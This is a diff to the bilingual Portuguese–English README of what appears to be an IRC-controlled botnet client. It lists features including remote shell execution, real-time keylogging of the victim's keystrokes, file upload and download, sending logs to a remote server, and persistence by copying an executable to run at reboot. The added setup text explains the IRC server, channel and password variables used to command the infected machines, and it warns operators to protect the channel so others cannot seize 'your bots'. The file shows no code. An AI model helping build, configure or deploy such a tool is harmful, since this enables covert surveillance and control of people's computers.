@@ -8,12 +8,12 @@ Versão: **1.0** *(version)*
 
 ## Funções *(features)*
 - Executar comandos shell *(shell command execution)* <br>
+- Keylogger - Captura de teclas digitadas pelo cliente em tempo real *(real-time keylogging)* <br>
 - Listar diretório atual do bot *(list current working directory)* <br>
 - Listar todos os arquivos de um *diretorio (list all directory files)* <br>
 - Obter ip local e externo do bot *(get local and WAN bot IP)* <br>
-- Captura de teclas digitadas pelo cliente em tempo real *(real-time keylogging)* <br>
-- Download de arquivos da web via HTTP *(HTTP web downloading) <br>
-- Upload de arquivos para servidor web via HTTP *(upload bot files to web server)
+- Download de arquivos da web via HTTP *(HTTP web downloading)* <br>
+- Upload de arquivos para servidor web via HTTP *(upload bot files to web server)* <br>
 - Envio de logs para servidor remoto *(send logs to remote server)* <br>
 - Deletar arquivos no BOT *(delete files)* <br>
 - Executar arquivos no BOT *(run files)*
@@ -27,11 +27,24 @@ Versão: **1.0** *(version)*
 https://sourceforge.net/projects/pyhook/
 
 ## Configuração *(setup)*
-**VARIÁVEIS:** *(variables)* <br>
+Algumas variáveis precisarão ser definidas ou alteradas, para que a conexão com o IRC seja feita corretamente: 
 
+**VARIÁVEIS:***(variables)* <br>
+
+***ircServer*** *(sets IRC server address)*
+Endereço do servidor IRC ao qual o BOT irá se conectar. <br>
 ***ldir*** *(sets local directory, dropping directory)*<br>
 Diretório local, onde será salvo o arquivo de log. <br>
-Diretório para o qual o .exe se copia para ser executado em persistência quando a máquina reiniciar. 
+Diretório para o qual o .exe se copia para ser executado em persistência quando a máquina reiniciar.
+
+***ircPwdCha*** *(sets IRC channel password)*
+Define o password do canal IRC ao qual o bot irá se conectar. <br>
+Caso o canal não possua password, deixar em branco ("") <br>
+Importante setar um password no canal para que outras pessoas não entrem e possam controlar os seus bots.
+
+***ircChanne*** *(sets IRC channel)*
+Canal do IRC ao qual o bot irá se conectar. <br>
+É interpretando as mensagens enviadas para o canal que o BOT irá executar os comandos internamente no cliente.
 
 ***urlUpload*** *(Upload page on remote server)*<br>
 Página de upload no servidor remoto, para a função de envio remoto. <br>
